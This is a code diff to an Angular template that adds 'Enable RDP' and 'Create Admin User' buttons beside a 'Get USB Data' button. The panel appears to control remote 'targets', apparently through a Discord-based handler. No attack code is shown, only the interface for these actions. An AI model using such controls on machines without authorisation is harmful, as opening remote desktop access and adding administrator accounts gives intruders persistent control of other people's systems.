@@ -85,4 +85,12 @@
     <button mat-button [disabled]="!target$.online" color="accent"
       (click)="wrocsidHandler('getUSBData', target$.identifier)">Get USB Data</button>
   </div>
+  <div>
+    <button mat-button [disabled]="!target$.online" color="accent"
+      (click)="wrocsidHandler('rdpEnable', target$.identifier)">Enable RDP</button>
+  </div>
+  <div>
+    <button mat-button [disabled]="!target$.online" color="accent"
+      (click)="wrocsidHandler('createAdminUser', target$.identifier)">Create Admin User</button>
+  </div>
 </div>
